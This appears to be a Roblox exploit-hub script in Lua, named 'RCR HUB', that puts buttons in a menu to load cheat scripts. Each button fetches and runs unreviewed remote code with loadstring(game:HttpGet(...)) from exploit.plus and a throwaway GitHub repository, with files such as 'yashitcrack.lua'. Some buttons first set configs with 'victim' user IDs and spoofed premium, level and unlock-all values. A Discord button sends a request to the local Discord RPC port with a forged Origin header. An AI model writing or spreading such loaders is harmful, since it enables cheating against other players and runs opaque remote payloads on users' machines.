local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "RCR HUB",
   LoadingTitle = "RCR HUB Loading...",
   LoadingSubtitle = "by me",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "RCR_Hub_Configs",
      FileName = "RCRHub"
   },
   Discord = {
      Enabled = true,
      Invite = "zeCVjkB29y",
      RememberJoins = true
   },
   KeySystem = false,
})

-- Create the Tab
local MainTab = Window:CreateTab("Home", 4483362458) 

-- The MODERN Execution Button
MainTab:CreateButton({
   Name = "MODERN",
   Callback = function()
       loadstring(game:HttpGet('https://exploit.plus/Loader'))()
   end,
})

-- The xorfee Execution Button
MainTab:CreateButton({
   Name = "xorfee",
   Callback = function()
       getgenv().Config = {
           victim = 716661842,
           helper = "",
           level = 979,
           streak = 1927,
           elo = 92802829228922892829272,
           keys = 0,
           premium = true,
           verified = false,
           unlockall = true,
           platform = "DESKTOP",
           join = "discord.gg/rivalscomp"
       }
       loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
   end,
})

-- The nosniy Execution Button
MainTab:CreateButton({
   Name = "nosniy",
   Callback = function()
       getgenv().Config = {
           victim = 20349956,
           helper = "",
           level = 1126,
           streak = 1927,
           elo = 92802829228922892829272,
           keys = 1000,
           premium = true,
           verified = false,
           unlockall = true,
           platform = "DESKTOP",
           join = "discord.gg/rivalscomp"
       }
       loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
   end,
})

-- The yabujin Execution Button
MainTab:CreateButton({
   Name = "yabujin",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/yashitcrack.lua"))()
   end,
})

-- The Discord Button
MainTab:CreateButton({
   Name = "Discord",
   Callback = function()
       if (setclipboard) then
           setclipboard("https://discord.gg/zeCVjkB29y")
       end
       
       if (request) then
           request({
               Url = 'http://127.0.0.1:6463/rpc?v=1',
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json',
                   ['Origin'] = 'https://discord.com'
               },
               Body = game:GetService('HttpService'):JSONEncode({
                   cmd = 'INVITE_BROWSER',
                   args = {
                       code = 'zeCVjkB29y'
                   },
                   nonce = game:GetService('HttpService'):GenerateGUID(false)
               }),
           })
       end

       Rayfield:Notify({
           Title = "Discord",
           Content = "Copied to clipboard!",
           Duration = 5,
           Image = 4483362458,
       })
   end,
})

Rayfield:Notify({
   Title = "RCR HUB",
   Content = "All features loaded!",
   Duration = 3,
   Image = 4483362458,
})
